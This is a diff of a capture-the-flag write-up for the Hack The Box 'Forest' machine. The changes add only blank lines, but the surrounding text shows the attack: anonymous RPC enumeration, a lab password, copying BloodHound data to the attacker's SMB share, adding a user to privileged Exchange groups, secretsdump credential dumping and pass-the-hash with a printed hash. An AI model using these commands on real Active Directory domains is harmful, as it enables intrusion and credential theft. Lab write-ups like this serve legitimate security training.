@@ -103,6 +103,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 # MSRPC ENUMERATION
 - Let start by check anonymous
+
 ```
 ┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
 └─$ rpcclient -U "" -N 10.10.10.161
@@ -111,6 +112,7 @@ rpcclient $>
 - From above, you can see that i was able to login as Anonymous user
 - In rpcclient, there is command called enumdomusers in which it dump users if it is allowed for that user to be list users
 - let check for this user that i have
+
 ```
                                                                                                                                                                                                                                         
 ┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
@@ -284,6 +286,7 @@ SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Stan
 LDAP        10.10.10.161    445    FOREST           [-] htb.local\svc-alfresco:s3rvice Error connecting to the domain, are you sure LDAP service is running on the target ?
 
 ```
+
 - From above, you can see that i can login with winrm in which it mean that i can use tool like evil-winrm to login in
 - Let enumerate shares before login with winrm
 
@@ -346,6 +349,7 @@ smb: \htb.local\> dir
   scripts                             D        0  Wed Sep 18 20:45:49 2019
 
 ```
+
 - let download shares and analysis for passwords especially after found it in my first box [Active-HTB](https://blackninja23.github.io/Active-HTB/) in which it was CVE-2014-1812(MS14-025)
 
 ```
@@ -399,6 +403,7 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
 
 ```
+
 - Since this is domain controllers, i wont rush into any fancy windows exploitaion at this moment
 - Insteady i would enumerate other users in the domain by using bloodhound
 
@@ -473,6 +478,7 @@ Mode                LastWriteTime         Length Name
 ```
 copy 20230426020822_BloodHound.zip \\10.10.14.81\\Q\\
 ```
+
 - Verify in your computer that file has been transfered successful by checking folder in which smbserver was started
 - with data that i have, i will open it with bloodhound
 
@@ -505,11 +511,13 @@ bloodhound
 - Before i continue, you need to check [hacktricks on Access Control Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
 - Since i am member of Account Operators and look at above pic, you can see GenericAll in which from hacktricks and it say that i have full control over it in which it mean that i have full control over enterprise key admins and exchange windows permissions but from [microsoft official page](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) about Account Operators and it say that ``Members of the Account Operators group can't manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can't modify user rights.`` in which maybe i should start with exchange windows permissions as this doesnot seems to be administrators
 - let me start with exchange windows permissions
+
 ```
 net user blackninja pass123@ /add
 net group "exchange windows permissions" blackninja /add /domain
 ```
 - let me try for enterprise key admins
+
 ```
 net group "enterprise key admins" blackninja /add /domain
 ```
@@ -543,6 +551,7 @@ impacket-secretsdump htb.local/blackninja:"pass123@"@10.10.10.161
 
 ![](/assets/img/HTB/easy/Forest/secretdump.png)
 - let try login as Administrator with pass the hash
+
 ```
 evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
